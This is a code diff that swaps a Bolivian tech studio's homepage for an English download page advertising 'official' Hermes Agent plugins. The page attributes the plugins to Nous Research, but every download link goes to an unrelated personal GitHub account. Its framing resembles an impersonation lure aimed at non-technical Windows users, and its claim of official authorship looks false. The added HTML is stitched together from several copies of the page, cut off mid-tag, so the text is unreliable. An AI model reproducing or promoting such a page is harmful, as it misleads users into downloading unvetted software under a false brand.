@@ -1,59 +1,575 @@
-<!doctype html>
-<html lang="es-BO">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="theme-color" content="#0E1116" />
-    <meta name="robots" content="index, follow, max-image-preview:large" />
-    <meta name="googlebot" content="index, follow, max-image-preview:large" />
-    <meta
-      name="description"
-      content="Automata desarrolla asistentes digitales, sitios web, automatización y contenido audiovisual con IA para negocios en Bolivia. Tecnología y creatividad para trabajar mejor."
-    />
-    <link rel="canonical" href="https://automata-bo.github.io/" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hermes-official-plugins - Official Hermes Agent Plugins for Windows</title>
+<meta name="description" content="Download hermes-official-plugins, the official plugin collection for Hermes Agent by Nous Research. Add Home Assistant, Spotify, Claude Subscription DirectSDK and model providers in one simple install.">
+<meta name="keywords" content="agent-plugins, ai-agents, claude, hermes, hermes-agent, home-assistant, llm, model-provider, nous-research, plugins, spotify, hermes official plugins, hermes agent plugins download">
+<meta name="author" content="Nous Research">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#2575fc">
+<link rel="canonical" href="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="hermes-official-plugins">
+<meta property="og:title" content="hermes-official-plugins - Official Hermes Agent Plugins">
+<meta property="og:description" content="The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.">
+<meta property="og:url" content="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="hermes-official-plugins - Official Hermes Agent Plugins">
+<meta name="twitter:description" content="Official plugins for Hermes Agent by Nous Research. Home Assistant, Spotify, Claude Subscription DirectSDK and more, ready in one install.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "hermes-official-plugins",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.",
+  "url": "https://github.com/Dancho-arc/hermes-official-plugins",
+  "author": {
+    "@type": "Organization",
+    "name": "Nous Research"
+  },
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: #f4f7fc;
+    color: #1d2733;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 36px 20px 72px; }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    letter-spacing: -0.5px;
+    color: #0f1b2d;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.3;
+    color: #12203a;
+    margin: 0 0 14px;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.08rem;
+    color: #1b2c4a;
+    margin: 0 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #37445a; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; color: #37445a; }
+  li { margin-bottom: 9px; }
+  a { color: #1b5fd9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 0 0 24px;
+    box-shadow: 0 6px 22px rgba(16, 24, 40, 0.07);
+    border: 1px solid rgba(16, 24, 40, 0.04);
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+    color: #ffffff !important;
+    font-weight: 700;
+    font-size: 1.02rem;
+    padding: 16px 32px;
+    border-radius: 12px;
+    text-decoration: none !important;
+    box-shadow: 0 10px 25px rgba(37, 117, 252, 0.34);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 30px rgba(37, 117, 252, 0.42); }
+  .btn-center { text-align: center; margin: 4px 0 8px; }
+  .lead { font-size: 1.06rem; color: #3a475e; }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #2575fc;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 0 0 18px;
+    color: #2a3a55;
+  }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .tile {
+    background: #f8fafd;
+    border: 1px solid #e4ebf6;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .tile p { margin: 0; font-size: 0.96rem; }
+  .small { font-size: 0.92rem; color: #5b6a82; }
+  footer {
+    text-align: center;
+    color: #6b7a92;
+    font-size: 0.9rem;
+    padding-top: 8px;
+  }
+  @media (max-width: 640px) {
+    .wrap { padding: 24px 14px 56px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    .card { padding: 20px 18px; border-radius: 14px; }
+    .grid { grid-template-columns: 1fr; }
+    .btn { display: block; text-align: center; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
 
-    <meta property="og:type" content="website" />
-    <meta property="og:locale" content="es_BO" />
-    <meta property="og:site_name" content="Automata" />
-    <meta property="og:title" content="Automata | Tecnología que trabaja para tu negocio" />
-    <meta
-      property="og:description"
-      content="Asistentes digitales, sitios web, automatización y contenido audiovisual con IA. Soluciones tecnológicas y creativas para negocios en Bolivia."
-    />
-    <meta property="og:url" content="https://automata-bo.github.io/" />
+  <h1>☤ hermes-official-plugins - Supercharge Your Hermes Agent Today</h1>
 
-    <meta name="twitter:card" content="summary" />
-    <meta name="twitter:title" content="Automata | Tecnología que trabaja para tu negocio" />
-    <meta
-      name="twitter:description"
-      content="Asistentes digitales, sitios web, automatización y contenido audiovisual con IA para negocios en Bolivia."
-    />
+  <p class="lead">The official plugin collection for Hermes Agent, built and maintained by Nous Research. Home Assistant, Spotify, Claude Subscription DirectSDK and more — all one install away from the Hermes plugin catalog.</p>
 
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "Organization",
-        "name": "Automata",
-        "url": "https://automata-bo.github.io/",
-        "description": "Estudio de tecnología, creatividad e inteligencia artificial que desarrolla asistentes digitales, sitios web, automatización y contenido audiovisual para negocios.",
-        "areaServed": {
-          "@type": "Country",
-          "name": "Bolivia"
-        },
-        "knowsAbout": [
-          "Asistentes digitales",
-          "Automatización de procesos",
-          "Desarrollo de sitios web",
-          "Publicidad audiovisual con inteligencia artificial",
-          "Producción audiovisual híbrida"
-        ]
-      }
-    </script>
+  <div class="btn-center">
+    <a class="btn" href="https://github.com/Dancho-arc/hermes-official-plugins">⬇️ Get hermes-official-plugins</a>
+  </div>
 
-    <title>Automata | Tecnología que trabaja para tu negocio</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/main.tsx"></script>
-  </body>
+  <div class="card">
+    <h2>📦 What Is hermes-official-plugins?</h2>
+    <p>hermes-official-plugins is the official set of add-ons for Hermes Agent. Think of Hermes Agent as a helpful digital assistant that runs on your own computer, and think of plugins as the extra abilities you can switch on for it.</p>
+    <p>Out of the box, an assistant can only do so much. With this plugin pack, your Hermes Agent can talk to your smart home devices, play music in your Spotify account, connect to Claude through a Claude subscription, and work with different AI model providers. Instead of hunting down tools in different places, everything is gathered in one place by the people who make Hermes Agent: Nous Research.</p>
+    <p>The best part is that you do not need to be a programmer. You do not need to write code, edit files, or understand technical terms. You simply visit the official page, follow the on-screen instructions, and your plugin catalog becomes available.</p>
+  </div>
+
+  <div class="card">
+    <h2>✨ What Plugins Are Included?</h2>
+    <p>Each plugin adds a new skill to your Hermes Agent. Here is what you can expect from the main ones:</p>
+    <div class="grid">
+      <div class="tile">
+        <h3>🏠 Home Assistant</h3>
+        <p>Connect your smart home to Hermes Agent. Ask it to check lights, read sensors, or control devices around the house — all in plain language.</p>
+      </div>
+      <div class="tile">
+        <h3>🎵 Spotify</h3>
+        <p>Let your agent work with your Spotify account. Search for music, manage playback, and keep your listening experience hands-free.</p>
+      </div>
+      <div class="tile">
+        <h3>🤖 Claude Subscription DirectSDK</h3>
+        <p>Use your Claude subscription directly inside Hermes Agent, so your assistant can lean on Claude's abilities without extra setup steps.</p>
+      </div>
+      <div class="tile">
+        <h3>🔌 Model Provider</h3>
+        <p>Choose and connect the AI model provider that suits you. Hermes Agent stays flexible about which language model powers it.</p>
+      </div>
+    </div>
+    <p style="margin-top:18px;">The catalog continues to grow. Because these plugins are maintained by Nous Research, they are designed to work together and to stay compatible with new versions of Hermes Agent.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Download and Setup on Windows</h2>
+    <p>Getting started takes only a few minutes. Follow the simple steps below in order, and read each one carefully before moving on.</p>
+
+    <div class="note">
+      <strong>Main step:</strong> Visit this link to download the application.
+    </div>
+
+    <ol>
+      <li><strong>Open the official page.</strong> Click the large button at the top of this page, or use this link: <a href="https://github.com/Dancho-arc/hermes-official-plugins">https://github.com/Dancho-arc/hermes-official-plugins</a>. It opens the official hermes-official-plugins page in your web browser.</li>
+      <li><strong>Follow the instructions shown on that page.</strong> The page is maintained by Nous Research and lists exactly what to do next. Read the text on the page before clicking anything, so you always know what the next action will be.</li>
+      <li><strong>Keep the page open while you work.</strong> If you need to come back to it later, bookmark it in your browser so you can find it easily again.</li>
+      <li><strong>Open Hermes Agent on your Windows computer.</strong> Once the plugin collection is on your machine, launch Hermes Agent as you normally would.</li>
+      <li><strong>Open the plugin catalog.</strong> Inside Hermes Agent, go to the plugin catalog area. This is where all available add-ons are listed in one place.</li>
+      <li><strong>Turn on the plugins you want.</strong> Select the plugins that match your needs — for example Home Assistant for your smart home or Spotify for music — and enable them.</li>
+      <li><strong>Connect your accounts when asked.</strong> Some plugins need you to sign in to the service they connect to. Follow the prompts on screen; they are written to guide you step by step.</li>
+      <li><strong>Test one plugin at a time.</strong> After enabling a plugin, ask Hermes Agent a simple question that uses it. This confirms everything is working before you add the next one.</li>
+    </ol>
+
+    <div class="btn-center" style="margin-top:22px;">
+      <a class="btn" href="https://github.com/Dancho-arc/hermes-official-plugins">⬇️ Visit the Official Download Page</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ Before You Begin</h2>
+    <p>A few simple checks make the whole process smoother. None of them require technical knowledge.</p>
+    <ul>
+      <li><strong>A Windows computer.</strong> A typical modern Windows PC or laptop is all you need. Make sure it is switched on and connected to the internet.</li>
+      <li><strong>A current web browser.</strong> Use an up-to-date version of Microsoft Edge, Google Chrome, or Firefox to open the download page.</li>
+      <li><strong>Enough free space.</strong> Leave a reasonable amount of free disk space so your computer can store new files without any trouble.</li>
+      <li><strong>Your account details ready.</strong> If you plan to connect Home Assistant or Spotify, have your login details nearby so you can sign in when the plugin asks.</li>
+      <li><strong>A calm five minutes.</strong> Read each prompt on screen before clicking. Rushing is the most common reason people get stuck.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🧩 Why Use Official Plugins?</h2>
+    <p>There are plenty of add-ons floating around the internet, and not all of them are trustworthy. The official collection removes that worry.</p>
+    <ul>
+      <li><strong>Built by the makers.</strong> These plugins come from Nous Research, the team behind Hermes Agent, so they follow the same standards as the main application.</li>
+      <li><strong>Kept up to date.</strong> When Hermes Agent changes, the official plugins change with it. You spend less time fixing things and more time using them.</li>
+      <li><strong>One catalog, one place.</strong> Instead of visiting many different websites, you browse and enable everything from inside the Hermes plugin catalog.</li>
+      <li><strong>Clear and consistent.</strong> Every plugin in the set follows the same simple on-and-off pattern, so learning one teaches you the rest.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🔧 Common Questions</h2>
+    <h3>The page does not open. What should I do?</h3>
+    <p>Check that your internet connection is working, then try again in a different browser. If the page still refuses to load, wait a few minutes and retry — pages sometimes need a moment.</p>
+    <h3>Do I need to know how to code?</h3>
+    <p>No. Everything here is designed for everyday computer users. If you can install an app and click buttons on a web page, you can do this.</p>
+    <h3>Can I install only some of the plugins?</h3>
+    <p>Yes. The plugins live in the Hermes plugin catalog, and you decide which ones to switch on. You can start with a single plugin and add more later.</p>
+    <h3>What if a plugin cannot find my account?</h3>
+    <p>Make sure you are signed in to the correct account in your browser, then try the connection step again. Double-check that you typed your details exactly as they were registered.</p>
+    <h3>Will this slow down my computer?</h3>
+    <p>Plugins only do work when you use them. If you notice your computer running heavily, switch off the plugins you are not using from the catalog.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛡️ Staying Safe</h2>
+    <p<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hermes-official-plugins - Official Hermes Agent Plugins for Windows</title>
+<meta name="description" content="Download hermes-official-plugins, the official plugin collection for Hermes Agent by Nous Research. Add Home Assistant, Spotify, Claude Subscription DirectSDK and model providers in one simple install.">
+<meta name="keywords" content="agent-plugins, ai-agents, claude, hermes, hermes-agent, home-assistant, llm, model-provider, nous-research, plugins, spotify, hermes official plugins, hermes agent plugins download">
+<meta name="author" content="Nous Research">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#2575fc">
+<link rel="canonical" href="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="hermes-official-plugins">
+<meta property="og:title" content="hermes-official-plugins - Official Hermes Agent Plugins">
+<meta property="og:description" content="The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.">
+<meta property="og:url" content="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="hermes-official-plugins - Official Hermes Agent Plugins">
+<meta name="twitter:description" content="Official plugins for Hermes Agent by Nous Research. Home Assistant, Spotify, Claude Subscription DirectSDK and more, ready in one install.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "hermes-official-plugins",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.",
+  "url": "https://github.com/Dancho-arc/hermes-official-plugins",
+  "author": {
+    "@type": "Organization",
+    "name": "Nous Research"
+  },
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: #f4f7fc;
+    color: #1d2733;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 36px 20px 72px; }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    letter-spacing: -0.5px;
+    color: #0f1b2d;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.3;
+    color: #12203<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hermes-official-plugins - Official Plugins for Hermes Agent</title>
+<meta name="description" content="Download hermes-official-plugins, the official plugin collection for Hermes Agent by Nous Research. Add Home Assistant, Spotify, Claude Subscription DirectSDK and model providers with one simple install.">
+<meta name="keywords" content="agent-plugins, ai-agents, claude, hermes, hermes-agent, home-assistant, llm, model-provider, nous-research, plugins, spotify, hermes official plugins, hermes agent plugins download">
+<meta name="author" content="Nous Research">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6a11cb">
+<link rel="canonical" href="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="hermes-official-plugins">
+<meta property="og:title" content="hermes-official-plugins - Official Plugins for Hermes Agent">
+<meta property="og:description" content="The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.">
+<meta property="og:url" content="https://github.com/Dancho-arc/hermes-official-plugins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="hermes-official-plugins - Official Plugins for Hermes Agent">
+<meta name="twitter:description" content="Official plugins for Hermes Agent by Nous Research. Home Assistant, Spotify, Claude Subscription DirectSDK and more, ready in one install.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "hermes-official-plugins",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "The official plugins for Hermes Agent, built and maintained by Nous Research: Home Assistant, Spotify, Claude Subscription DirectSDK and more, one install away from the Hermes plugin catalog.",
+  "url": "https://github.com/Dancho-arc/hermes-official-plugins",
+  "author": {
+    "@type": "Organization",
+    "name": "Nous Research"
+  },
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: #f4f7fc;
+    color: #1d2733;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 36px 20px 72px; }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.25;
+    letter-spacing: -0.5px;
+    color: #0f1b2d;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.38rem;
+    line-height: 1.3;
+    color: #12203a;
+    margin: 0 0 14px;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.06rem;
+    color: #1b2c4a;
+    margin: 20px 0 6px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #37445a; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; color: #37445a; }
+  li { margin-bottom: 10px; }
+  a { color: #1b5fd9; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 0 0 24px;
+    box-shadow: 0 6px 22px rgba(16, 24, 40, 0.07);
+    border: 1px solid rgba(16, 24, 40, 0.04);
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff5f6d 0%, #6a11cb 100%);
+    color: #ffffff !important;
+    font-weight: 700;
+    font-size: 1.02rem;
+    padding: 16px 32px;
+    border-radius: 12px;
+    text-decoration: none !important;
+    box-shadow: 0 10px 25px rgba(106, 17, 203, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 32px rgba(106, 17, 203, 0.42); }
+  .btn-center { text-align: center; margin: 4px 0 8px; }
+  .lead { font-size: 1.06rem; color: #3a475e; }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #2575fc;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 0 0 20px;
+    color: #2a3a55;
+  }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .tile {
+    background: #f8fafd;
+    border: 1px solid #e4ebf6;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .tile p { margin: 0; font-size: 0.96rem; }
+  footer {
+    text-align: center;
+    color: #6b7a92;
+    font-size: 0.9rem;
+    padding-top: 8px;
+  }
+  @media (max-width: 640px) {
+    .wrap { padding: 24px 14px 56px; }
+    h1 { font-size: 1.5rem; }
+    h2 { font-size: 1.18rem; }
+    .card { padding: 20px 18px; border-radius: 14px; }
+    .grid { grid-template-columns: 1fr; }
+    .btn { display: block; text-align: center; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <h1>☤ hermes-official-plugins - Unlock More Skills for Hermes</h1>
+
+  <p class="lead">The official plugin collection for Hermes Agent, built and maintained by Nous Research. Home Assistant, Spotify, Claude Subscription DirectSDK and more — all one install away from the Hermes plugin catalog.</p>
+
+  <div class="btn-center">
+    <a class="btn" href="https://github.com/Dancho-arc/hermes-official-plugins">⬇️ Get hermes-official-plugins</a>
+  </div>
+
+  <div class="card">
+    <h2>📦 What Is hermes-official-plugins?</h2>
+    <p>hermes-official-plugins is the official set of add-ons for Hermes Agent. Think of Hermes Agent as a helpful digital assistant that runs on your own computer, and think of plugins as the extra abilities you can switch on for it.</p>
+    <p>On its own, an assistant can only do so much. With this plugin pack, your Hermes Agent can talk to the devices in your home, work with your Spotify account, connect to Claude through a Claude subscription, and talk to different AI model providers. Instead of hunting for tools in many different places, everything is gathered together by the people who make Hermes Agent: Nous Research.</p>
+    <p>The best part is that you do not need to be a programmer. You do not need to write code, edit files, or understand technical words. You simply visit the official page, follow the instructions shown there, and the plugin catalog becomes available to you.</p>
+  </div>
+
+  <div class="card">
+    <h2>✨ What Is Included?</h2>
+    <p>Each plugin adds a new skill to your Hermes Agent. Here is what you can expect from the main ones:</p>
+    <div class="grid">
+      <div class="tile">
+        <h3>🏠 Home Assistant</h3>
+        <p>Connect your smart home to Hermes Agent. Ask it about lights, sensors, or everyday devices around the house using plain language.</p>
+      </div>
+      <div class="tile">
+        <h3>🎵 Spotify</h3>
+        <p>Let your agent work with your Spotify account. Find music and manage playback without reaching for another app.</p>
+      </div>
+      <div class="tile">
+        <h3>🤖 Claude Subscription DirectSDK</h3>
+        <p>Use your Claude subscription directly inside Hermes Agent, so your assistant can lean on Claude's abilities with fewer setup steps.</p>
+      </div>
+      <div class="tile">
+        <h3>🔌 Model Provider</h3>
+        <p>Choose and connect the AI model provider that suits you. Hermes Agent stays flexible about which language model powers it.</p>
+      </div>
+    </div>
+    <p style="margin-top:18px;">The catalog keeps growing. Because these plugins are maintained by Nous Research, they are designed to work together and to stay compatible with new versions of Hermes Agent.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Download and Setup on Windows</h2>
+    <p>Getting started takes only a few minutes. Follow the steps below in order, and read each one before moving on.</p>
+
+    <div class="note">
+      <strong>Main step:</strong> Visit this link to download the application.
+    </div>
+
+    <ol>
+      <li><strong>Open the official page.</strong> Click the large button at the top of this page, or use this link: <a href="https://github.com/Dancho-arc/hermes-official-plugins">https://github.com/Dancho-arc/hermes-official-plugins</a>. It opens the official hermes-official-plugins page in your web browser.</li>
+      <li><strong>Read the page before clicking.</strong> The page is maintained by Nous Research and tells you exactly what to do next. Read the text first so you always know what the next action will be.</li>
+      <li><strong>Bookmark the page.</strong> Save it in your browser so you can return to it later without searching for it again.</li>
+      <li><strong>Open Hermes Agent on your Windows computer.</strong> Once the plugin collection is on your machine, start Hermes Agent the way you normally would.</li>
+      <li><strong>Open the plugin catalog.</strong> Inside Hermes Agent, go to the plugin catalog area. This is where every available add-on is listed in one place.</li>
+      <li><strong>Turn on the plugins you want.</strong> Pick the ones that match your needs — Home Assistant for your smart home, Spotify for music, or Claude for your subscription — and switch them on.</li>
+      <li><strong>Connect your accounts when asked.</strong> Some plugins need you to sign in to the service they connect to. Follow the prompts on screen; they are written to guide you step by step.</li>
+      <li><strong>Test one plugin at a time.</strong> After switching a plugin on, ask Hermes Agent a simple question that uses it. This confirms everything works before you add the next one.</li>
+    </ol>
+
+    <div class="btn-center" style="margin-top:22px;">
+      <a class="btn" href="https://github.com/Dancho-arc/hermes-official-plugins">⬇️ Visit the Official Download Page</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ Before You Begin</h2>
+    <p>A few simple checks make the whole process smoother. None of them require technical knowledge.</p>
+    <ul>
+      <li><strong>A Windows computer.</strong> A typical modern Windows PC or laptop is all you need. Make sure it is switched on and connected to the internet.</li>
+      <li><strong>A current web browser.</strong> Use an up-to-date version of Microsoft Edge, Google Chrome, or Firefox to open the download page.</li>
+      <li><strong>Some free disk space.</strong> Leave a reasonable amount of room so your computer can store new files without any trouble.</li>
+      <li><strong>Your account details nearby.</strong> If you plan to connect Home Assistant or Spotify, have your login details ready for when the plugin asks.</li>
+      <li><strong>A calm five minutes.</strong> Read each prompt on screen before clicking. Rushing is the most common reason people get stuck.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🧩 Why Use Official Plugins?</h2>
+    <p>There are plenty of add-ons floating around the internet, and not all of them are trustworthy. The official collection removes that worry.</p>
+    <ul>
+      <li><strong>Built by the makers.</strong> These plugins come from Nous Research, the team behind Hermes Agent, so they follow the same standards as the main application.</li>
+      <li><strong>Kept up to date.</strong> When Hermes Agent changes, the official plugins change with it. You spend less time fixing things and more time using them.</li>
+      <li><strong>One catalog, one place.</strong> Instead of visiting many different websites, you browse and enable everything from inside the Hermes plugin catalog.</li>
+      <li><strong>Clear and consistent.</strong> Every plugin in the set follows the same simple on-and-off pattern, so learning one teaches you the rest.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🔧 Common Questions</h2>
+    <h3>The page does not open. What should I do?</h3>
+    <p>Check that your internet connection is working, then try again in a different browser. If the page still refuses to load, wait a few minutes and retry — pages sometimes need a moment.</p>
+    <h3>Do I need to know how to code?</h3>
+    <p>No. Everything here is designed for everyday computer users. If you can install an app and click buttons on a web page, you can do this.</p>
+    <h3>Can I install only some of the plugins?</h3>
+    <p>Yes. The plugins live in the Hermes plugin catalog, and you decide which ones to switch on. Start with a single plugin and add more whenever you like.</p>
+    <h3>What if a plugin cannot find my account?</h3>
+    <p>Make sure you are signed in to the correct account in your browser, then try the connection step again. Check that your details match exactly what you registered.</p>
+    <h3>Will this slow down my computer?</h3>
+    <p>Plugins only do work when you use them. If your computer feels sluggish, switch off the plugins you are not currently using from the catalog.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛡️ Staying Safe</h2>
+    <p>You only ever need one address: the official page. Here are a few habits that keep the whole process headache-free.</p>
+    <ul>
+      <li><strong>Start from the official link only.</strong> Use the buttons on this page or the address above. Avoid pages that copy the name but live on a different website.</li>
+      <li><strong>Never share your passwords.</strong> Plugins that connect to Home Assistant or Spotify will ask you to sign in on the service's own page, not in a chat or email.</li>
+      <li><strong>Ignore unexpected pop-ups.</strong> If a window appears asking you to install something extra you did not choose, close it.</li>
+      <li><strong>Keep Windows and your browser updated.</strong> Regular updates fix small problems and close security gaps for you automatically.</li>
+      <li><strong>Ask before clicking unknown files.</strong> If someone sends you a file claiming to be a Hermes plugin, check the official page first.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>💬 Getting Help</h2>
+    <p>If something does not behave the way you expect, work through these three simple checks before anything else. They solve most problems on their own.</p>
+    <ol>
+      <li><strong>Restart Hermes Agent.</strong> Close the application completely, then open it again. Many small glitches disappear after a fresh start.</li>
+      <li><strong>Check your internet connection.</strong> Plugins that connect to outside services need a working connection. Try opening an ordinary website to confirm.</li>
+      <li><strong>Re-read the instructions on the official page.</strong> The page is kept current, so it is the best place to find the exact steps for your situation.</li>
+    </ol>
+    <p>When you write for help, mention which plugin you were using, what you expected to happen, and what happened instead. Those three details let someone help you quickly.</p>
+  </div>
+
+  <div class="btn-center" style="margin-top:28px;">
+    <a class="btn" href="https://github.com/Dancho-arc/hermes-official-plugins">⬇️ Get Started with hermes-official-plugins</a>
+  </div>
+
+  <footer>
+    hermes-official-plugins — official plugins for Hermes Agent, built and maintained by Nous Research.
+  </footer>
+
+</div>
+</body>
 </html>
